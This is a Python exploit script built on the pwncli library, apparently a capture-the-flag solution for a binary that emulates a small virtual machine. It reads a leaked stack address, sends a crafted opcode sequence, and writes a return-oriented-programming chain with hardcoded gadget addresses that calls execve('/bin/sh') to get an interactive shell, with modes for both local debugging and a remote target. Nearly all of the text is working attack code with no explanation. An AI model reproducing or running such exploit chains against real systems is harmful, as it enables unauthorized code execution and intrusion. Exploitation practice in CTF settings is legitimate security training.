#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b'your vm starts at ')
stack_addr = int(ru(b"\n", drop=True), 16)
lg("stack_addr")
ret_addr = stack_addr - 0x10
bin_sh = stack_addr + 0x30

command = b"0 "
command += b"10 "
command += b"10 "
command += b"10 "


command += b"10 "
command += b"10 "

command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "

command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "
command += b"10 "
command += b"7 "

# command += b"10 "
# command += b"3 "
command += b"16"
ru(b'your command:\n')
s(command)

pop_rdi_ret = 0x00000000004017cb
pop_rsi_ret = 0x00000000004016f0
pop_rax_ret = 0x0000000000401468
syscall_addr = 0x000000000040146a

data = [
    b"0", b"-14",
    i2b(-18362 + 7), i2b(0x00000007),
    i2b(-18362 + 6 + 42), i2b(ret_addr & 0xffffffff ),
    i2b(-18362 + 7 + 42), i2b( (ret_addr>>32) & 0xffffffff ),

    b"2", i2b(u32_ex(b"/bin")),
    b"3", i2b(u32_ex(b"/sh\x00")),

    b"10", i2b(pop_rdi_ret),
    b"10", i2b(2),

    b"10", i2b(bin_sh & 0xffffffff),
    b"10", i2b(4),
    b"10", i2b((bin_sh>>32) & 0xffffffff),
    b"10", i2b(5),
    b"10", i2b(pop_rsi_ret),
    b"10", i2b(6),
    b"10", i2b(0),
    b"10", i2b(7),
    b"10", i2b(0),
    b"10", i2b(8),
    b"10", i2b(0),
    b"10", i2b(9),
    b"10", i2b(pop_rax_ret),
    b"10", i2b(10),
    b"10", i2b(0),
    b"10", i2b(11),
    b"10", i2b(59),
    b"10", i2b(12),
    b"10", i2b(0),
    b"10", i2b(13),
    b"10", i2b(syscall_addr),
    b"10", i2b(14),
    b"10", i2b(0),
    b"10", i2b(15),
    b"10", i2b(u32_ex(b"/bin")),
    b"10", i2b(16),
    b"10", i2b(u32_ex(b"/sh\x00")),
    b"10", i2b(17),
    b"10", i2b(0),
    b"10", i2b(18),

    # b"8", i2b(0x1c8),
    # b"0", b"8",
]
ru(b'your cost:\n')
for i in data:
    sl(i)
sl(i2b(0xdeadbeef))


ia()
